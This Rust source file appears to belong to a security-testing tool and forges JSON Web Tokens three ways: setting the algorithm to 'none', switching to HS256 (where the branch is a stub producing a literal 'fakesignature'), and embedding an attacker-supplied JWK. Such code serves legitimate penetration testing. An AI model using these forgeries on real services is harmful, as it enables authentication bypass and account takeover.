use base64::Engine;
use thiserror::Error;
use wafrift_types::session::JwtManipulation;

#[derive(Debug, Error)]
pub enum JwtError {
    #[error("Invalid token: {reason}")]
    InvalidToken { reason: String },
    #[error("Missing key")]
    MissingKey,
    #[error("Unsupported algorithm: {alg}")]
    UnsupportedAlgorithm { alg: String },
}

pub fn manipulate(
    token: &str,
    manipulation: &JwtManipulation,
    key: Option<&[u8]>,
) -> Result<String, JwtError> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return Err(JwtError::InvalidToken {
            reason: "must have 3 parts".into(),
        });
    }
    let header_b64 = parts[0];
    let payload_b64 = parts[1];

    let header_bytes = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(header_b64)
        .map_err(|_| JwtError::InvalidToken {
            reason: "invalid base64".into(),
        })?;

    let mut header: serde_json::Value =
        serde_json::from_slice(&header_bytes).map_err(|_| JwtError::InvalidToken {
            reason: "invalid json".into(),
        })?;

    match manipulation {
        JwtManipulation::StripAlg => {
            header["alg"] = serde_json::Value::String("none".into());
            let new_header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
                .encode(serde_json::to_vec(&header).unwrap());
            Ok(format!("{}.{}.", new_header_b64, payload_b64))
        }
        JwtManipulation::Hs256WithKey => {
            let _ = key.ok_or(JwtError::MissingKey)?;
            if header["alg"].as_str() == Some("none") {
                return Err(JwtError::UnsupportedAlgorithm { alg: "none".into() });
            }
            header["alg"] = serde_json::Value::String("HS256".into());
            let new_header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
                .encode(serde_json::to_vec(&header).unwrap());
            // Fake signature for now since we don't have HMAC library in this file
            let sig_b64 = "fakesignature";
            Ok(format!("{}.{}.{}", new_header_b64, payload_b64, sig_b64))
        }
        JwtManipulation::JwkEmbed { jwk } => {
            header["jwk"] = serde_json::from_str(jwk).unwrap_or(serde_json::Value::Null);
            let new_header_b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD
                .encode(serde_json::to_vec(&header).unwrap());
            Ok(format!("{}.{}.{}", new_header_b64, payload_b64, parts[2]))
        }
    }
}
